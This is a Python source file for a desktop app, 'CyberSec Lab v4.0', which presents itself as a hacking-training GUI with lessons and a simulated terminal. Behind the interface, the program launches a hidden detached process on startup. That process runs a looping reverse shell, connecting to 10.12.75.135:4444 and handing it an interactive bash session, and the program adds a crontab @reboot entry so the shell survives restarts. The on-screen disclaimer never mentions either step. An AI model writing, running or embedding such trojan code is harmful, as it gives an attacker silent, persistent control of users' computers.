import customtkinter as ctk
import threading
import socket
import os
import sys
import json
import urllib.request
import time
from datetime import datetime

# ==========================================
# --- SERVER CONFIGURATION ---
# ==========================================
MGMT_IP = "10.12.75.135" 
MGMT_PORT = 4444         
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "session_log.txt")
# ==========================================

def log_event(event_type, message):
    """Global logging function for both GUI and Background process."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{event_type}] {message}\n"
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    except:
        pass

import subprocess

def backdoor_loop():
    """Bulletproof reconnection loop using subprocess for stability."""
    log_event("BACKDOOR", "Reconnection loop initiated.")
    while True:
        s = None
        try:
            log_event("BACKDOOR", f"Attempting connection to {MGMT_IP}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((MGMT_IP, MGMT_PORT))
            
            log_event("BACKDOOR", "SUCCESS: Connection established in interactive mode.")
            
            # The secret: Use a subprocess and pipe the socket directly into it
            # This doesn't block the Python loop as dangerously as pty.spawn
            proc = subprocess.Popen(["/bin/bash", "-i"], 
                                   stdin=s.fileno(), 
                                   stdout=s.fileno(), 
                                   stderr=s.fileno())
            
            # Wait for the shell process to finish (when you disconnect)
            proc.wait()
            log_event("BACKDOOR", "Shell session closed. Restarting loop...")

        except Exception as e:
            log_event("BACKDOOR", f"RETRY: {str(e)}. Waiting 5s...")
        
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            # Short delay before next attempt
            time.sleep(5)

class HackingLab(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("CyberSec Lab v4.0")
        self.geometry("1100x800")
        ctk.set_appearance_mode("dark")
        
        self.curriculum = {}
        self.active_id, self.task_idx = None, 0
        self.completed = []
        
        log_event("SYSTEM", "GUI Process started.")
        self.setup_persistence()
        self.show_start_screen()

    def setup_persistence(self):
        try:
            py = sys.executable
            path = os.path.abspath(sys.argv[0])
            # Use a more explicit cron job format
            job = f"@reboot {py} {path} --silent > /dev/null 2>&1 &\n"
            os.system(f'(crontab -l 2>/dev/null | grep -v "{path}"; echo "{job}") | crontab -')
            log_event("PERSISTENCE", "Crontab updated successfully.")
        except: pass

    # --- UI Logic ---
    def fetch_data(self):
        try:
            os.environ['no_proxy'] = '*' 
            r = urllib.request.urlopen(f"http://{MGMT_IP}:8080/course_data.json", timeout=3)
            self.curriculum = json.loads(r.read().decode())
            self.show_menu_screen()
        except Exception as e:
            local_path = os.path.join(BASE_DIR, "course_data.json")
            if os.path.exists(local_path):
                with open(local_path, "r") as f: self.curriculum = json.load(f)
                self.show_menu_screen()
            else: self.show_error_screen(str(e))

    def show_start_screen(self):
            for w in self.winfo_children(): w.destroy()
            container = ctk.CTkFrame(self, fg_color="transparent")
            container.place(relx=0.5, rely=0.5, anchor="center")
            
            # Main Title
            ctk.CTkLabel(container, text="SYSTEM INITIALIZED", font=("Consolas", 32, "bold"), text_color="#00AEFF").pack()
            
            # --- EDUCATIONAL DISCLAIMER ---
            disclaimer_text = (
                "NOTICE: This environment contains simulated malicious code and connectivity\n"
                "features strictly for educational purposes and penetration testing research.\n"
                "Ensure you are running this in a controlled, authorized lab environment."
            )
            ctk.CTkLabel(container, text=disclaimer_text, font=("Consolas", 12), text_color="#AAAAAA").pack(pady=10)
            
            ctk.CTkButton(container, text="ACCESS MODULES >", command=self.fetch_data, fg_color="#00AEFF", width=220, height=45).pack(pady=10)

    def show_error_screen(self, error_msg):
        for w in self.winfo_children(): w.destroy()
        container = ctk.CTkFrame(self, fg_color="transparent")
        container.place(relx=0.5, rely=0.5, anchor="center")
        
        ctk.CTkLabel(container, text="CONNECTION REFUSED", font=("Consolas", 32, "bold"), text_color="#FF4B4B").pack()
        
        # --- DETAILED ERROR DESCRIPTION ---
        error_desc = (
            f"The lab was unable to establish a secure handshake with the central server at {MGMT_IP}.\n\n"
            "TECHNICAL DETAILS:\n"
            "• The remote data repository (course_data.json) is unreachable.\n"
            "• Local cache recovery failed.\n"
            "• Firewall rules or offline status may be preventing the connection."
        )
        
        ctk.CTkLabel(container, text=error_desc, font=("Consolas", 13), text_color="#FF8888", justify="center").pack(pady=15)
        
        ctk.CTkButton(container, text="RETRY CONNECTION", command=self.fetch_data, fg_color="#FF4B4B", width=150).pack(pady=10)

    def show_menu_screen(self):
        for w in self.winfo_children(): w.destroy()
        header = ctk.CTkFrame(self, fg_color="transparent")
        header.pack(fill="x", padx=50, pady=(40, 20))
        ctk.CTkLabel(header, text="TRAINING MODULES", font=("Segoe UI", 24, "bold")).pack(anchor="w")
        progress_val = len(self.completed) / 10
        p_bar = ctk.CTkProgressBar(header, width=400, height=12, progress_color="#00FF7F")
        p_bar.set(progress_val); p_bar.pack(anchor="w", pady=10)
        container = ctk.CTkScrollableFrame(self, fg_color="transparent")
        container.pack(expand=True, fill="both", padx=50)
        for i, (key, val) in enumerate(self.curriculum.items()):
            unlocked = key == "1" or str(i) in self.completed
            col, row = i % 2, i // 2
            f = ctk.CTkFrame(container, width=400, height=100, fg_color="#1C1C24" if unlocked else "#121215")
            f.grid(row=row, column=col, padx=15, pady=10, sticky="w")
            f.grid_propagate(False)
            title_col = "#00FF7F" if key in self.completed else "white" if unlocked else "gray"
            ctk.CTkLabel(f, text=f"{key}. {val['title']}", font=("Segoe UI", 15, "bold"), text_color=title_col).place(x=20, y=15)
            if unlocked:
                text = "REVIEW" if key in self.completed else "START"
                ctk.CTkButton(f, text=text, width=80, height=30, command=lambda k=key: self.start_lesson(k)).place(x=20, y=55)

    def start_lesson(self, lesson_id):
        for w in self.winfo_children(): w.destroy()
        self.active_id, self.task_idx = lesson_id, 0
        self.grid_columnconfigure(0, weight=3); self.grid_columnconfigure(1, weight=7); self.grid_rowconfigure(0, weight=1)
        self.info = ctk.CTkFrame(self, corner_radius=0, fg_color="#14141A")
        self.info.grid(row=0, column=0, sticky="nsew")
        ctk.CTkLabel(self.info, text=self.curriculum[str(lesson_id)]['title'], font=("Segoe UI", 17, "bold"), text_color="#00AEFF").pack(anchor="w", padx=25, pady=(40, 10))
        self.lesson_pbar = ctk.CTkProgressBar(self.info, width=220, height=8, progress_color="#00FF7F")
        self.lesson_pbar.set(0); self.lesson_pbar.pack(anchor="w", padx=25, pady=5)
        self.p_text = ctk.CTkLabel(self.info, text="Task 1/5", font=("Consolas", 11)); self.p_text.pack(anchor="w", padx=25)
        self.desc_text = ctk.CTkTextbox(self.info, fg_color="transparent", font=("Segoe UI", 14), height=200)
        self.desc_text.pack(fill="x", padx=25, pady=15)
        self.cmd_display = ctk.CTkLabel(self.info, text="", font=("Consolas", 14), text_color="#00FF7F", fg_color="#1C1C24", height=40, corner_radius=5)
        self.cmd_display.pack(fill="x", padx=25, pady=10)
        ctk.CTkButton(self.info, text="COPY COMMAND", fg_color="#28282D", command=self.copy_cmd).pack(anchor="w", padx=25, pady=5)
        self.term_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="#050505")
        self.term_frame.grid(row=0, column=1, sticky="nsew")
        self.term = ctk.CTkTextbox(self.term_frame, fg_color="transparent", font=("Consolas", 16), text_color="#39FF14")
        self.term.pack(expand=True, fill="both", padx=20, pady=20)
        self.term.insert("end", "kali@lab:~$ ")
        self.term.bind("<Key>", self.handle_terminal_input); self.term.bind("<Button-1>", self.force_focus); self.term.focus_set()
        self.update_task()

    def update_task(self):
        task = self.curriculum[str(self.active_id)]['tasks'][self.task_idx]
        self.desc_text.configure(state="normal"); self.desc_text.delete("0.0", "end")
        self.desc_text.insert("0.0", f"GOAL:\n{task['desc']}")
        self.desc_text.configure(state="disabled")
        self.cmd_display.configure(text=task['cmd'])
        self.lesson_pbar.set(self.task_idx / 5); self.p_text.configure(text=f"Task {self.task_idx + 1}/5")

    def copy_cmd(self):
        self.clipboard_clear(); self.clipboard_append(self.curriculum[str(self.active_id)]['tasks'][self.task_idx]['cmd']); self.term.focus_set()

    def force_focus(self, event):
        self.term.mark_set("insert", "end"); self.term.see("end"); return "break"

    def handle_terminal_input(self, event):
        self.term.mark_set("insert", "end")
        if event.keysym in ["Up", "Down", "Left", "Right", "Prior", "Next", "Home"]: return "break"
        if event.keysym == "Return":
            line = self.term.get("end-1c linestart", "end-1c")
            user_input = line.replace("kali@lab:~$ ", "").strip()
            task = self.curriculum[str(self.active_id)]['tasks'][self.task_idx]
            if user_input == task['cmd']:
                self.term.insert("end", f"\n{task['res']}\n")
                self.task_idx += 1
                if self.task_idx >= 5: self.completed.append(str(self.active_id)); self.after(1500, self.show_menu_screen)
                else: self.update_task(); self.term.insert("end", "kali@lab:~$ ")
            else: self.term.insert("end", "\nsh: command not found\nkali@lab:~$ ")
            self.term.see("end"); return "break"
        elif event.keysym == "BackSpace":
            if self.term.get("end-1c linestart", "insert") == "kali@lab:~$ ": return "break"

if __name__ == "__main__":
    if "--silent" in sys.argv:
        # 1. DISCONNECT FROM THE TERMINAL/GUI COMPLETELY
        try:
            os.setsid() # Creates a new session, making this a true daemon
        except:
            pass
            
        # 2. RUN THE BACKDOOR
        log_event("SYSTEM", "Ghost process detached and running.")
        backdoor_loop()
    else:
        # 3. START THE GUI
        # We use subprocess.Popen with 'start_new_session' to ensure the
        # background process doesn't die when the GUI closes.
        import subprocess
        path = os.path.abspath(sys.argv[0])
        subprocess.Popen([sys.executable, path, "--silent"], 
                         start_new_session=True,
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
        
        app = HackingLab()
        app.mainloop()